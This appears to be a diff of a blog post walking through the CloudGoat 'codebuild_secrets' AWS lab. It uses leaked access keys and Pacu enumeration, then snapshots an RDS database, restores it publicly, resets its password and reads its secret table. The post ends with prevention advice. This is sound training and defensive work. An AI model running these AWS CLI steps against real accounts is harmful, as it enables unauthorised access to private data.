-<p>The issue with option 1 is that we have no idea what this might break. It could cause the entire app stack which leverages this DB to crash. As soon as that happens someone will start to dig into why did it crash and inevitably start asking questions about why the DB suddenly changed subnets. Option 2 is a valid and viable option, but in this scenario not necessary. We will move ahead with option 3.
-Back to enumeration! Lets see if we can gain some insight into the subnets, and security groups.</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile cal rds describe-db-subnet-groups |jq
-</code></pre></td></tr></table>
-</div>
-</div><p>Looking at the output from the command above we see all of the subnets that rds has access to. The two subnets associated with the instance we discovered earlier are a part of a group which has the description: <code>CloudGoat cgidg25jfhzv9a Subnet Group</code>. There does appear to be another subnet group called: <code>cloud-goat-rds-testing-subnet-group-cgidg25jfhzv9a</code> and has a description of <code>CloudGoat cgidg25jfhzv9a Subnet Group ONLY for Testing with Public Subnets</code>. Perhaps we could use this group to grant public access to an instance.</p>
-<p>Next we should see if there is a security group that would allow us to access the RDS instance. We can use the following command:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile cal ec2 describe-security-groups |jq
-</code></pre></td></tr></table>
-</div>
-</div><p>The output from the command above reveals that the group sg-096bb9f39aaa9334d is a security group that allows access to the postgres port. Screenshot is below.</p>
-<p><img src=images/rds-security-group.png alt=rds_security_group class=img-fluid></p>
-<hr>
-<h3 id=our-own-db>Our own DB</h3>
-<p>At this point we know we have a subnet, and a security group that we can apply to an RDS instance that should grant us the access we are looking for. The next thing we should do is see if we have rights to create a snapshot.</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile cal rds create-db-snapshot --db-instance-identifier cg-rds-instance-cgidg25jfhzv9a --db-snapshot-identifier yogi-db-snap
-</code></pre></td></tr></table>
-</div>
-</div><p>After running the command above we get an output that shows us that the command was successful, and that the current status is creating.</p>
-<p><img src=images/db-snap.png alt=db_snap class=img-fluid>
-Before we can restore our snapshot to an RDS instance that we control the snapshot needs to be completed. We can check that by using the describe-db-snapshots command.</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile cal rds describe-db-snapshots --db-snapshot-identifier yogi-db-snap
-</code></pre></td></tr></table>
-</div>
-</div><p>After executing that command we get the output below, which tells us that we do not have permissions to check on the status of our db.</p>
-<p><img src=images/rds-describe.png alt=rds_describe class=img-fluid></p>
-<p>Hopefully, this is not a sign of things to come. Since we do not know if the snapshot is complete the only option we have is to wait until we think its done. After that we can attempt to restore it, and hopefully we will have enough permissions to do so.</p>
-<p>To restore the database we need the following bits information that we discovered earlier:</p>
-<ul>
-<li>RDS Public Subnet Name: cloud-goat-rds-testing-subnet-group-cgidg25jfhzv9a</li>
-<li>VPC Security group that grants us access: sg-096bb9f39aaa9334d</li>
-</ul>
-<p>We can use the information above and build the command below to start the build process:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile cal rds restore-db-instance-from-db-snapshot --db-instance-identifier yogidbinstance --db-snapshot-identifier yogi-db-snap --db-subnet-group-name cloud-goat-rds-testing-subnet-group-cgidg25jfhzv9a --publicly-accessible --vpc-security-group-ids sg-096bb9f39aaa9334d
-</code></pre></td></tr></table>
-</div>
-</div><p>The output should return something similar to the image below with the &lsquo;DBInstanceStatus&rsquo; of creating</p>
-<p><img src=images/db-creating.png alt=db_creating class=img-fluid></p>
-<p>After a couple of minutes we can check the status of our creation with:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile cal rds describe-db-instances --db-instance-identifier yogidbinstance |jq <span style=color:#0c6>&#39;.DBInstances[] .DBInstanceStatus&#39;</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>Once the output shows that the db is &lsquo;available&rsquo; we can attemp to connect. The connection address was given to us when we ran the restore command above, but if you lost that we can get the information with the following command:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile cal rds describe-db-instances --db-instance-identifier yogidbinstance |jq <span style=color:#0c6>&#39;.DBInstances[] .Endpoint&#39;</span>
-</code></pre></td></tr></table>
-</div>
-</div><p><img src=images/yogi-instance.png alt=yogi_instance class=img-fluid></p>
-<p>We can use psql to attempt a connection to the db host:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>psql -h yogidbinstance.cq9megh2xpgg.us-east-1.rds.amazonaws.com -p <span style=color:#5918bb;font-weight:700>5432</span>
-</code></pre></td></tr></table>
-</div>
-</div><p><img src=images/psql-success.png alt=psql_success class=img-fluid></p>
-<p>Great, we have a connetion! Now we need to connect with the default cgadmin and the admin password. However, before we do that we need to set the password to something we know. To do that we need to run the modify-db-instance command:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>aws --profile cal rds modify-db-instance --db-instance-identifier yogidbinstance --master-user-password yogibear
-</code></pre></td></tr></table>
-</div>
-</div><p>We will receive an output that shows:</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=color:#0c6>&#34;PendingModifiedValues&#34;</span>: <span style=color:#2c5dcd>{</span>
- <span style=color:#0c6>&#34;MasterUserPassword&#34;</span>: <span style=color:#0c6>&#34;****&#34;</span>
-<span style=color:#2c5dcd>}</span>,
-</code></pre></td></tr></table>
-</div>
-</div><p>Now lets try to connect to our RDS instance one more time.</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>psql postgresql://cgadmin@yogidbinstance.cq9megh2xpgg.us-east-1.rds.amazonaws.com:5432/postgres
-</code></pre></td></tr></table>
-</div>
-</div><p>We can list the databases with <code>\l</code></p>
-<p><img src=images/postgres-list.png alt=postgres_list class=img-fluid></p>
-<p>Looking at the output, the securedb looks interesting. Lets connect to it, list the tables, and print it all to the screen.</p>
-<div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4>
-<table style=border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block><tr><td style=vertical-align:top;padding:0;margin:0;border:0>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
-</span><span style="margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
-</span></code></pre></td>
-<td style=vertical-align:top;padding:0;margin:0;border:0;width:100%>
-<pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-postgres data-lang=postgres><span style=color:#fff;background-color:#c00>\</span>c securedb
-<span style=color:#fff;background-color:#c00>\</span>dt
-<span style=color:#2c5dcd;font-weight:700>SELECT</span> <span style=color:#2c5dcd>*</span> <span style=color:#2c5dcd;font-weight:700>FROM</span> sensitive_information;
-</code></pre></td></tr></table>
-</div>
-</div><p><img src=images/victory.png alt=victory.png class=img-fluid></p>
-<p>Awesome! We succesfull gained access to the secret information within the RDS database.</p>
-<hr>
-<h3 id=alternative-path>Alternative Path</h3>
-<p>There is another way to gain access to the secrets held in the database. I have not worked through that path. Once I do I will update this document.</p>
-<hr>
-<h3 id=prevention>Prevention</h3>
-<p>Where did the owner of this account go wrong? There are a few places where this attack could have be stopped. Lets dive into them.</p>
-<ol>
-<li>Our initial access was through the solo user. Does that user need static keys? If they could be switched to temorary ephemeral keys it would greatly reduce the liklihood that if an attacker found the keys that they would still be valid.</li>
-<li>Does solo need access to codebuild? Chances are they do, the permissions seemed to be fairly tightly scoped around that service. But if they do not, removing those capabilities would be good.</li>
-<li>Within the codebuild project we came across keys for the calrissian user. Those keys should not exist within this project. Assuming the keys were placed there to grant the Linux container associated with this project access to RDS or other portions of AWS, there are better ways to do this. Assigning a role to the node where the container lives would be the best option. If the container does not live within aws, using a secrets manager is the next best thing.</li>
-<li>The calrissian user seemed to have a mismash of permissions in RDS. If these permission are not all required they should be removed. Specifically the modify-db-instance, and create-db-snapshot permissions.</li>
-</ol>
-<p>By fixing one of these things or all of them, it would have effected our ability to access the secret data within the database.</p>
-<p>From a logging and alerting point of view, we probably made several commands that were not &lsquo;normal&rsquo; for the solo and calrissian users to make. By alerting on this odd activity the response team could have detected us and shut the attack down. Additionally if there would have been a configuration management solution to monitor for RDS instances being made public and preventing it. It would have made our attack much more complicated.</p>
-</div>
-</div>
-<div class=col-md-3 id=sidebar data-spy=affix-bottom data-offset-top=0>
-<nav class="post-sidebar hidden-print hidden-sm hidden-xs affix sticky" id=post-nav>
-<h5>contents</h5>
-<ul class="nav post-sidenav">
-<li><nav id=TableOfContents>
-<ul>
-<li>
-<ul>
-<li><a href=#who-are-we>Who are we?</a></li>
-<li><a href=#what-can-we-do>What can we do?</a></li>
-<li><a href=#additional-service-enumeration>Additional Service Enumeration</a></li>
-<li><a href=#codebuild-enum>Codebuild Enum</a></li>
-<li><a href=#codebuild-manual-enumeration>Codebuild Manual Enumeration</a></li>
-<li><a href=#calrissian>Calrissian</a></li>
-<li><a href=#our-own-db>Our own DB</a></li>
-<li><a href=#alternative-path>Alternative Path</a></li>
-<li><a href=#prevention>Prevention</a></li>
-</ul>
-</li>
-</ul>
-</nav></li>
-</ul>
-</nav>
-</div>
-</div>
-</div>
-</div>
-<footer>
-</footer>
-</body>
-<script src=https://code.jquery.com/jquery-3.3.1.slim.min.js integrity=sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo crossorigin=anonymous></script>
+<!doctype html><html lang=en><head><script async src="https://www.googletagmanager.com/gtag/js?id=UA-133811886-2"></script>
+<script>window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","UA-133811886-2")</script><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta http-equiv=x-ua-compatible content="IE=edge"><script src=/js/nav.js></script>
+<link rel="shortcut icon" href=/favicon.ico><link rel=stylesheet href=https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css integrity=sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T crossorigin=anonymous><link rel=stylesheet href=/css/main.css><title>codebuild_secrets | jellyparks</title></head><body><header></header><div class=site-wrapper><div class="sticky top-bar"><div id=mySidenav class=sidenav include-nav=/nav.html></div><span class="sticky hamburger" style=font-size:30px;cursor:pointer onclick=openNav()>&#9776;</span></div><div class=container><div class=blog-header><h1>codebuild_secrets</h1></div><div class=row><div class="col-sm-8 blog-main"><div class=blog-post><hr><p>According to the official documentation for this scenario (<a href=https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/scenarios/codebuild_secrets>here</a>) the overall goal is &ldquo;a pair of secret strings that are stored in a secure RDS database.&rdquo;</p><p>Once the scenario creation process completes we are presented with a set of access keys for the user account &lsquo;solo&rsquo;.</p><hr><h3 id=who-are-we>Who are we?</h3><p>First lets make sure the credentials we have obtained are valid. We can do this with the following command:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile solo sts get-caller-identity
+</span></span></code></pre></td></tr></table></div></div><p>we get the following successful response:</p><p><img src=images/initial-user.png alt="Initial User" class=img-fluid></p><hr><h3 id=what-can-we-do>What can we do?</h3><p>Instead of heading to Pacu and using its handy enumeration lets do something that is a bit lighter on the logs and just poke around a bit. Perhaps we have access to make s3 calls, lets run <code>s3 ls</code> and see what happens.</p><p><img src=images/s3-ls.png alt=s3-ls class=img-fluid></p><p>Interesting, it does seem like we can see a bucket in s3. Perhaps we can dig deeper and this bucket has something useful in it. After all, judging by its name it probably has some sort of logs and probably other things and stuff in it. We can do this by running:</p><pre tabindex=0><code>aws --profile solo s3 ls logaboutlogsthingsandstuff34343434
+</code></pre><p><img src=images/logsaboutstuff.png alt=logsaboutstuff class=img-fluid></p><p>Unfortunatly it looks like it errors out with a permission denied error. Lets continue on our path of manual enumeration. This time we will branch over into ec2&rsquo;s. Why ec2&rsquo;s, and why did we try s3 first? No real reason, other than to hit services that are fairly common, and that a vast majority of identities have access to.</p><p>To enumerate the ec2&rsquo;s we will use the describe call:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile solo ec2 describe-instances |jq <span style=color:#0c6>&#39;.Reservations[].Instances[] | {InstanceId,PublicDnsName,PublicIpAddress,SubnetId,SecurityGroups,IamInstanceProfile}&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p>This produces the output below, showing us an active ec2 with a public ip address.</p><p><img src=images/ec2-enum.png alt=ec2_enum class=img-fluid></p><p>Interesting, lets see if we can dig a bit deeper into the security group that is attached with the name: <code>cg-ec2-ssh-cgidg25jfhzv9a</code>. Chances are that it only allows ssh since its in the name, but who knows a lazy admin could have added other ports to the security group for quick access. We can get the security group details with:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>aws --profile solo ec2 describe-security-groups --group-ids sg-09f30e4f217cd294a --region us-east-1 | jq <span style=color:#0c6>&#39;.SecurityGroups[] | .IpPermissions[]&#39;</span>
+</span></span></code></pre></td></tr></table></div></div><p>As expected, the only port allowed with this security gorup is <code>TCP/22</code>.</p><p><img src=images/ec2-sec.png alt=ec2_sec class=img-fluid></p><hr><h3 id=additional-service-enumeration>Additional Service Enumeration</h3><p>We now know we cannot see anything useful in S3 and there is not much to do with the Ec2. We could pivot and attempt to log into the SSH. That however, is beyond the scope of this assessment. The great thing about AWS is there are several other services we can enumerate. These keys we have were created for a reason. Up to this point we really have not discovered that reason. MORE enumeration!</p><p>For this next part we will switch over to Pacu and let it handle some of the additional enumeration for us. There are several services that are not included in Pacu that these keys could be used for, but sometimes its nice to let tools live up to there purpose. Looking at the picture below we can see Pacu has several options within the ENUM category:</p><p><img src=images/pacu-enum-options.png alt=pacu_enum_options class=img-fluid></p><p>Some of these we have lightly touched. Perhaps we have rights to Lambda? Lets see what happens if we try the <code>lambda__enum</code>.</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>run lambda__enum --region us-east-1
+</span></span></code></pre></td></tr></table></div></div><p>*<em>Note: In the command above I specify the us-east-1 region, this is because I know us-east-1 is only region in my account where workloads are being placed. If you do not know where the workloads exist, you will have to enumerate each region.</em></p><p><img src=images/lambda-enum.png alt=lambda_enum class=img-fluid></p><p>Once again, brick wall. We are missing the required permissions. All of the other service enumerations return the same results except for one, codebuild.</p><hr><h3 id=codebuild-enum>Codebuild Enum</h3><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>run codebuild__enum
+</span></span></code></pre></td></tr></table></div></div><p><img src=images/codebuild-enum.png alt=codebuild_enum class=img-fluid></p><p>Success! The codebuild enumeration found 1 project and 2 environment variables. Neat! In Pacu we can run the <code>data</code> command to see the information it pulled from our enumeration efforts. Below is a snippet of the data:</p><div class=highlight><div style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#4d4d4d;background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">46
